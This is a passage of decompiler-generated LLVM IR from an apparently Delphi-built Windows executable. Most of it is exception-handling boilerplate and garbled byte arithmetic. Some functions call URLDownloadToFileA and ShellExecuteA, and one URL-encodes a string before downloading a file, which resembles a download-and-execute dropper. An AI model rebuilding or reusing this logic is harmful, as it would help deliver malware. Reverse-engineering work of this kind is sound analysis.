dec_label_pc_404949:                              ; preds = %dec_label_pc_4048e2, %dec_label_pc_404927
  %eax.4.reload = load i32, i32* %eax.4.reg2mem
  %.pre-phi21.reload = load i8*, i8** %.pre-phi21.reg2mem
  %.pre-phi22.reload = load i8, i8* %.pre-phi22.reg2mem
  %.reload25 = load i8, i8* %.reg2mem24, !insn.addr !358
  %factor7 = mul i8 %.pre-phi22.reload, 4
  %94 = add i8 %.reload25, %factor7, !insn.addr !359
  store i8 %94, i8* %.pre-phi21.reload, align 1, !insn.addr !359
  ret i32 %eax.4.reload, !insn.addr !359

dec_label_pc_404952:                              ; preds = %dec_label_pc_4048e0
  %95 = load i8, i8* %.pre-phi.reload, align 1, !insn.addr !360
  %96 = add i8 %95, %.pre-phi15.reload, !insn.addr !360
  store i8 %96, i8* %.pre-phi.reload, align 1, !insn.addr !360
  store i8 %96, i8* %.reg2mem26, !insn.addr !360
  br label %dec_label_pc_404954, !insn.addr !360

dec_label_pc_404954:                              ; preds = %dec_label_pc_4048cb.dec_label_pc_404954_crit_edge, %dec_label_pc_404952
  %.reload27 = load i8, i8* %.reg2mem26, !insn.addr !361
  %factor8 = mul i8 %.pre-phi15.reload, 7
  %97 = add i8 %.reload27, %factor8, !insn.addr !362
  store i8 %97, i8* %.pre-phi.reload, align 1, !insn.addr !362
  store i8 %.pre-phi15.reload, i8* %.pre-phi17.reg2mem, !insn.addr !362
  store i8* %.pre-phi.reload, i8** %.pre-phi16.reg2mem, !insn.addr !362
  store i8 %97, i8* %.reg2mem28, !insn.addr !362
  store i32 %eax.3.reload, i32* %eax.5.reg2mem, !insn.addr !362
  br label %dec_label_pc_404962, !insn.addr !362

dec_label_pc_404962:                              ; preds = %dec_label_pc_40490f.dec_label_pc_404962_crit_edge, %dec_label_pc_404954
  %eax.5.reload = load i32, i32* %eax.5.reg2mem
  %.reload29 = load i8, i8* %.reg2mem28, !insn.addr !363
  %.pre-phi16.reload = load i8*, i8** %.pre-phi16.reg2mem
  %.pre-phi17.reload = load i8, i8* %.pre-phi17.reg2mem
  %98 = add i8 %.reload29, %.pre-phi17.reload, !insn.addr !363
  store i8 %98, i8* %.pre-phi16.reload, align 1, !insn.addr !363
  %99 = add i32 %14, 117, !insn.addr !364
  %100 = inttoptr i32 %99 to i32*, !insn.addr !364
  %101 = load i32, i32* %100, align 4, !insn.addr !364
  %102 = mul i32 %101, 808467313, !insn.addr !364
  %103 = xor i32 %eax.5.reload, 1848851762, !insn.addr !365
  %104 = add i32 %102, 61, !insn.addr !366
  %105 = inttoptr i32 %104 to i32*, !insn.addr !366
  %106 = load i32, i32* %105, align 4, !insn.addr !366
  %107 = xor i32 %106, %14, !insn.addr !366
  %108 = icmp eq i32 %107, 0, !insn.addr !366
  %109 = inttoptr i32 %102 to i32*, !insn.addr !367
  %110 = load i32, i32* %109, align 4, !insn.addr !367
  call void @__asm_outsd(i16 %16, i32 %110), !insn.addr !367
  %111 = icmp eq i1 %108, false, !insn.addr !368
  store i32 %103, i32* %eax.6.reg2mem, !insn.addr !368
  br i1 %111, label %112, label %dec_label_pc_404979, !insn.addr !368

; <label>:112:                                    ; preds = %dec_label_pc_404962
  %113 = call i32 @unknown_49a9(), !insn.addr !368
  store i32 %113, i32* %eax.6.reg2mem, !insn.addr !368
  br label %dec_label_pc_404979, !insn.addr !368

dec_label_pc_404979:                              ; preds = %112, %dec_label_pc_404962
  %eax.6.reload = load i32, i32* %eax.6.reg2mem
  %114 = inttoptr i32 %eax.6.reload to i8*
  %115 = load i8, i8* %114, align 1, !insn.addr !369
  %116 = trunc i32 %eax.6.reload to i8
  %factor9 = mul i8 %116, 11
  %117 = add i8 %factor9, %115, !insn.addr !370
  store i8 %117, i8* %114, align 1, !insn.addr !370
  %.pre20 = mul i8 %116, 8
  store i8 %.pre20, i8* %factor10.pre-phi.reg2mem, !insn.addr !370
  store i8* %114, i8** %.pre-phi18.reg2mem, !insn.addr !370
  store i8 %117, i8* %.reg2mem30, !insn.addr !370
  store i32 %107, i32* %ebp.0.reg2mem, !insn.addr !370
  br label %dec_label_pc_404997, !insn.addr !370

dec_label_pc_404997:                              ; preds = %dec_label_pc_404925.dec_label_pc_404997_crit_edge, %dec_label_pc_404979
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  %.reload31 = load i8, i8* %.reg2mem30, !insn.addr !371
  %.pre-phi18.reload = load i8*, i8** %.pre-phi18.reg2mem
  %factor10.pre-phi.reload = load i8, i8* %factor10.pre-phi.reg2mem
  %118 = add i8 %.reload31, %factor10.pre-phi.reload, !insn.addr !372
  store i8 %118, i8* %.pre-phi18.reload, align 1, !insn.addr !372
  %119 = add i32 %ebp.0.reload, -117, !insn.addr !373
  %120 = inttoptr i32 %119 to i8*, !insn.addr !373
  %121 = load i8, i8* %120, align 1, !insn.addr !373
  %122 = trunc i32 %3 to i8, !insn.addr !373
  %123 = add i8 %121, %122, !insn.addr !373
  store i8 %123, i8* %120, align 1, !insn.addr !373
  %124 = call i8 @__asm_in(i16 %16), !insn.addr !374
  %125 = call i32 @__readfsdword(i32 0), !insn.addr !375
  store i32 %125, i32* %stack_var_-15, align 4, !insn.addr !375
  %126 = ptrtoint i32* %stack_var_-15 to i32, !insn.addr !375
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !376
  %127 = load i32, i32* @global_var_409688, align 4, !insn.addr !377
  %128 = add i32 %127, 1, !insn.addr !377
  store i32 %128, i32* @global_var_409688, align 4, !insn.addr !377
  %129 = load i32, i32* %stack_var_-15, align 4, !insn.addr !378
  call void @__writefsdword(i32 0, i32 %129), !insn.addr !379
  ret i32 0, !insn.addr !380
}

define i32 @function_4049cd() local_unnamed_addr {
dec_label_pc_4049cd:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !381
  ret i32 %0, !insn.addr !381
}

define i32 @function_4049d2() local_unnamed_addr {
dec_label_pc_4049d2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !382
}

define i32 @function_4049d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4049d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !383
}

define i32 @function_4049d8() local_unnamed_addr {
dec_label_pc_4049d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409688, align 4, !insn.addr !384
  %2 = add i32 %1, -1, !insn.addr !384
  store i32 %2, i32* @global_var_409688, align 4, !insn.addr !384
  ret i32 %0, !insn.addr !385
}

define i32 @function_4049e0() local_unnamed_addr {
dec_label_pc_4049e0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !386
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !386
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !386
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !387
  %2 = load i32, i32* @global_var_40968c, align 4, !insn.addr !388
  %3 = add i32 %2, 1, !insn.addr !388
  store i32 %3, i32* @global_var_40968c, align 4, !insn.addr !388
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !389
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !390
  ret i32 0, !insn.addr !391
}

define i32 @function_404a05() local_unnamed_addr {
dec_label_pc_404a05:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !392
  ret i32 %0, !insn.addr !392
}

define i32 @function_404a0a() local_unnamed_addr {
dec_label_pc_404a0a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !393
}

define i32 @function_404a0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !394
}

define i32 @function_404a10() local_unnamed_addr {
dec_label_pc_404a10:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !395
  %2 = add i32 %1, -1, !insn.addr !395
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !395
  ret i32 %0, !insn.addr !396
}

define i32* @function_404a18(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !397
  ret i32* %0, !insn.addr !397
}

define i32 @function_404a20() local_unnamed_addr {
dec_label_pc_404a20:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !398
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !398
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !398
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !399
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !400
  %3 = add i32 %2, 1, !insn.addr !400
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !400
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !401
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !402
  ret i32 0, !insn.addr !403
}

define i32 @function_404a45() local_unnamed_addr {
dec_label_pc_404a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !404
  ret i32 %0, !insn.addr !404
}

define i32 @function_404a4a() local_unnamed_addr {
dec_label_pc_404a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !405
}

define i32 @function_404a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !406
}

define i32 @function_404a50() local_unnamed_addr {
dec_label_pc_404a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !407
  %2 = add i32 %1, -1, !insn.addr !407
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !407
  ret i32 %0, !insn.addr !408
}

define i32 @function_404a58() local_unnamed_addr {
dec_label_pc_404a58:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !409
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !409
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !409
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !410
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !411
  %3 = add i32 %2, 1, !insn.addr !411
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !411
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !412
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !413
  ret i32 0, !insn.addr !414
}

define i32 @function_404a7d() local_unnamed_addr {
dec_label_pc_404a7d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !415
  ret i32 %0, !insn.addr !415
}

define i32 @function_404a82() local_unnamed_addr {
dec_label_pc_404a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !416
}

define i32 @function_404a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !417
}

define i32 @function_404a88() local_unnamed_addr {
dec_label_pc_404a88:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !418
  %2 = add i32 %1, -1, !insn.addr !418
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !418
  ret i32 %0, !insn.addr !419
}

define i32 @function_404a90() local_unnamed_addr {
dec_label_pc_404a90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !420
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !420
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !420
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !421
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !422
  %3 = add i32 %2, 1, !insn.addr !422
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !422
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !423
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !424
  ret i32 0, !insn.addr !425
}

define i32 @function_404ab5() local_unnamed_addr {
dec_label_pc_404ab5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !426
  ret i32 %0, !insn.addr !426
}

define i32 @function_404aba() local_unnamed_addr {
dec_label_pc_404aba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !427
}

define i32 @function_404abc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !428
}

define i32 @function_404ac0() local_unnamed_addr {
dec_label_pc_404ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !429
  %2 = add i32 %1, -1, !insn.addr !429
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !429
  ret i32 %0, !insn.addr !430
}

define i32 @function_404ac8(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404ac8:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !431
  ret i32 %0, !insn.addr !431
}

define i32 @function_404ad0() local_unnamed_addr {
dec_label_pc_404ad0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !432
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !432
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !432
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !433
  %2 = load i32, i32* @global_var_40969c, align 4, !insn.addr !434
  %3 = add i32 %2, 1, !insn.addr !434
  store i32 %3, i32* @global_var_40969c, align 4, !insn.addr !434
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !435
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !436
  ret i32 0, !insn.addr !437
}

define i32 @function_404af5() local_unnamed_addr {
dec_label_pc_404af5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !438
  ret i32 %0, !insn.addr !438
}

define i32 @function_404afa() local_unnamed_addr {
dec_label_pc_404afa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !439
}

define i32 @function_404afc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404afc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !440
}

define i32 @function_404b00() local_unnamed_addr {
dec_label_pc_404b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40969c, align 4, !insn.addr !441
  %2 = add i32 %1, -1, !insn.addr !441
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !441
  ret i32 %0, !insn.addr !442
}

define i32 @function_404b08() local_unnamed_addr {
dec_label_pc_404b08:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !443
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_404b0c, label %dec_label_pc_404b15, !insn.addr !444

dec_label_pc_404b0c:                              ; preds = %dec_label_pc_404b08
  %4 = add nuw nsw i32 %3, 48, !insn.addr !445
  ret i32 %4, !insn.addr !446

dec_label_pc_404b15:                              ; preds = %dec_label_pc_404b08
  %5 = add nuw nsw i32 %3, 55, !insn.addr !447
  ret i32 %5, !insn.addr !448
}

define i32 @function_404b20() local_unnamed_addr {
dec_label_pc_404b20:
  %esp.2.reg2mem = alloca i32, !insn.addr !449
  %esp.1.reg2mem = alloca i32, !insn.addr !449
  %cf.0.reg2mem = alloca i1, !insn.addr !449
  %esi.0.reg2mem = alloca i32, !insn.addr !449
  %esp.0.reg2mem = alloca i32, !insn.addr !449
  %ebx.0.reg2mem = alloca i32, !insn.addr !449
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !450
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !451
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !451
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !451
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !452
  %4 = call i32 @"@LStrClr"(), !insn.addr !453
  %5 = call i32 @function_4034c8(), !insn.addr !454
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !455
  br i1 %6, label %dec_label_pc_404c21, label %dec_label_pc_404b6d.preheader, !insn.addr !455

dec_label_pc_404b6d.preheader:                    ; preds = %dec_label_pc_404b20
  %7 = add i32 %0, -1, !insn.addr !456
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_404b6d

dec_label_pc_404b6d:                              ; preds = %dec_label_pc_404b6d.preheader, %dec_label_pc_404c19
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !456
  %9 = inttoptr i32 %8 to i8*, !insn.addr !456
  %10 = load i8, i8* %9, align 1, !insn.addr !456
  %11 = icmp eq i8 %10, 32, !insn.addr !456
  %12 = icmp eq i1 %11, false, !insn.addr !457
  br i1 %12, label %dec_label_pc_404b88, label %dec_label_pc_404b77, !insn.addr !457

dec_label_pc_404b77:                              ; preds = %dec_label_pc_404b6d
  %13 = call i32 @"@LStrCat"(), !insn.addr !458
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !459
  br label %dec_label_pc_404c19, !insn.addr !459

dec_label_pc_404b88:                              ; preds = %dec_label_pc_404b6d
  %14 = icmp ult i8 %10, 32, !insn.addr !460
  br i1 %14, label %dec_label_pc_404bab, label %dec_label_pc_404b92, !insn.addr !461

dec_label_pc_404b92:                              ; preds = %dec_label_pc_404b88
  %15 = add i8 %10, -32, !insn.addr !462
  %16 = icmp ult i8 %15, 95, !insn.addr !463
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !464
  br i1 %17, label %dec_label_pc_404b9f, label %dec_label_pc_404ba9, !insn.addr !464

dec_label_pc_404b9f:                              ; preds = %dec_label_pc_404b92
  %18 = load i32, i32* inttoptr (i32 4213856 to i32*), align 32, !insn.addr !465
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !465
  %21 = shl i32 1, %20, !insn.addr !465
  %22 = and i32 %18, %21, !insn.addr !465
  %23 = icmp ne i32 %22, 0, !insn.addr !465
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !465
  br label %dec_label_pc_404ba9, !insn.addr !465

dec_label_pc_404ba9:                              ; preds = %dec_label_pc_404b92, %dec_label_pc_404b9f
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !466
  br i1 %24, label %dec_label_pc_404c00, label %dec_label_pc_404bab, !insn.addr !466

dec_label_pc_404bab:                              ; preds = %dec_label_pc_404ba9, %dec_label_pc_404b88
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !467
  %27 = add i32 %esp.0.reload, -4, !insn.addr !468
  %28 = inttoptr i32 %27 to i32*, !insn.addr !468
  store i32 %26, i32* %28, align 4, !insn.addr !468
  %29 = add i32 %esp.0.reload, -8, !insn.addr !469
  %30 = inttoptr i32 %29 to i32*, !insn.addr !469
  store i32 ptrtoint (i32* @global_var_404c74 to i32), i32* %30, align 4, !insn.addr !469
  %31 = call i32 @function_404b08(), !insn.addr !470
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !471
  %33 = add i32 %esp.0.reload, -12, !insn.addr !472
  %34 = inttoptr i32 %33 to i32*, !insn.addr !472
  store i32 0, i32* %34, align 4, !insn.addr !472
  %35 = call i32 @function_404b08(), !insn.addr !473
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !474
  %37 = add i32 %esp.0.reload, -16, !insn.addr !475
  %38 = inttoptr i32 %37 to i32*, !insn.addr !475
  store i32 0, i32* %38, align 4, !insn.addr !475
  %39 = call i32 @"@LStrCatN"(), !insn.addr !476
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !477
  br label %dec_label_pc_404c19, !insn.addr !477

dec_label_pc_404c00:                              ; preds = %dec_label_pc_404ba9
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !478
  %41 = call i32 @"@LStrCat"(), !insn.addr !479
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !479
  br label %dec_label_pc_404c19, !insn.addr !479

dec_label_pc_404c19:                              ; preds = %dec_label_pc_404c00, %dec_label_pc_404bab, %dec_label_pc_404b77
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !480
  %43 = add i32 %esi.0.reload, -1, !insn.addr !481
  %44 = icmp eq i32 %43, 0, !insn.addr !481
  %45 = icmp eq i1 %44, false, !insn.addr !482
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !482
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !482
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !482
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !482
  br i1 %45, label %dec_label_pc_404b6d, label %dec_label_pc_404c21, !insn.addr !482

dec_label_pc_404c21:                              ; preds = %dec_label_pc_404c19, %dec_label_pc_404b20
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !483
  %47 = load i32, i32* %46, align 4, !insn.addr !483
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !484
  %48 = add i32 %esp.2.reload, 8, !insn.addr !485
  %49 = inttoptr i32 %48 to i32*, !insn.addr !485
  store i32 4213835, i32* %49, align 4, !insn.addr !485
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !486
  %51 = call i32 @"@LStrClr"(), !insn.addr !487
  ret i32 %51, !insn.addr !488
}

define i32 @function_404c44() local_unnamed_addr {
dec_label_pc_404c44:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !489
  ret i32 %0, !insn.addr !489
}

define i32 @function_404c49() local_unnamed_addr {
dec_label_pc_404c49:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !490
}

define i32 @function_404c4b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404c4b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !491
}

define i32 @function_404c6f() local_unnamed_addr {
dec_label_pc_404c6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !492
  %2 = inttoptr i32 %0 to i32*, !insn.addr !492
  store i32 %1, i32* %2, align 4, !insn.addr !492
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !493
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !493
  %7 = add i8 %4, %6, !insn.addr !493
  %8 = inttoptr i32 %5 to i8*, !insn.addr !493
  store i8 %7, i8* %8, align 1, !insn.addr !493
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !494
  %10 = load i32, i32* %eax, align 4, !insn.addr !494
  %11 = udiv i32 %10, 256, !insn.addr !494
  %12 = trunc i32 %11 to i8, !insn.addr !494
  %13 = add i8 %9, %12, !insn.addr !494
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !494
  %14 = call i32 @function_4036b8(), !insn.addr !495
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !496
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !496
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !496
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !497
  %17 = call i32 @"@LStrCatN"(), !insn.addr !498
  %18 = call i32 @function_4036c8(), !insn.addr !499
  %19 = inttoptr i32 %18 to i32*, !insn.addr !500
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !500
  call void @__writefsdword(i32 0, i32 0), !insn.addr !501
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !502
  ret i32 %21, !insn.addr !503
}

define i32 @function_404c78() local_unnamed_addr {
dec_label_pc_404c78:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404ce6() local_unnamed_addr {
dec_label_pc_404ce6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !504
  ret i32 %0, !insn.addr !504
}

define i32 @function_404ceb() local_unnamed_addr {
dec_label_pc_404ceb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !505
}

define i32 @function_404ced(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404ced:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !506
}

define i32 @function_404cf7() local_unnamed_addr {
dec_label_pc_404cf7:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !507
  %5 = inttoptr i32 %3 to i32*, !insn.addr !507
  store i32 %4, i32* %5, align 4, !insn.addr !507
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !508
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !508
  %10 = add i8 %7, %9, !insn.addr !508
  %11 = inttoptr i32 %8 to i8*, !insn.addr !508
  store i8 %10, i8* %11, align 1, !insn.addr !508
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !509
  %14 = udiv i32 %1, 256, !insn.addr !509
  %15 = trunc i32 %14 to i8, !insn.addr !509
  %16 = add i8 %13, %15, !insn.addr !509
  %17 = load i32, i32* %edi, align 4, !insn.addr !509
  %18 = inttoptr i32 %17 to i8*, !insn.addr !509
  store i8 %16, i8* %18, align 1, !insn.addr !509
  %19 = load i8, i8* %6, align 4, !insn.addr !510
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !510
  %22 = add i8 %19, %21, !insn.addr !510
  %23 = inttoptr i32 %20 to i8*, !insn.addr !510
  store i8 %22, i8* %23, align 1, !insn.addr !510
  %24 = add i32 %0, -117, !insn.addr !511
  %25 = inttoptr i32 %24 to i8*, !insn.addr !511
  %26 = load i8, i8* %25, align 1, !insn.addr !511
  %27 = trunc i32 %2 to i8, !insn.addr !511
  %28 = add i8 %26, %27, !insn.addr !511
  store i8 %28, i8* %25, align 1, !insn.addr !511
  %29 = trunc i32 %2 to i16, !insn.addr !512
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !512
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !513
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !513
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !513
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !514
  %33 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !515
  %34 = add i32 %33, 1, !insn.addr !515
  store i32 %34, i32* @global_var_4096a0, align 4, !insn.addr !515
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !516
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !517
  ret i32 0, !insn.addr !518
}

define i32 @function_404d25() local_unnamed_addr {
dec_label_pc_404d25:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !519
  ret i32 %0, !insn.addr !519
}

define i32 @function_404d2a() local_unnamed_addr {
dec_label_pc_404d2a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !520
}

define i32 @function_404d2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d2c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !521
}

define i32 @function_404d30() local_unnamed_addr {
dec_label_pc_404d30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !522
  %2 = add i32 %1, -1, !insn.addr !522
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !522
  ret i32 %0, !insn.addr !523
}

define i32 @function_404d38() local_unnamed_addr {
dec_label_pc_404d38:
  %eax.0.reg2mem = alloca i32, !insn.addr !524
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !525
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !526
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !527
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !528
